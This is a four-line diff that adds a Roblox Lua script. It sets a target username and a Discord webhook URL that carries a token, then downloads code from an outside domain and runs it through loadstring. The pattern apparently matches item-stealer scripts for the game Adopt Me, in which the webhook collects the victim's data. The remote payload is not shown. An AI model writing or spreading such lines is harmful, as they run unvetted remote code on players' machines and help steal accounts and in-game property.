@@ -1,0 +1,4 @@
+Username = "AngeIOfHearts"
+Webhook = "https://discord.com/api/webhooks/1264530426136105031/4D8yeRa9pmA2_yboh-u6HANNfpXeHPcHyLFZwsRT1GZNKocxuS1QUgNADinzD3foS3BT"
+
+loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
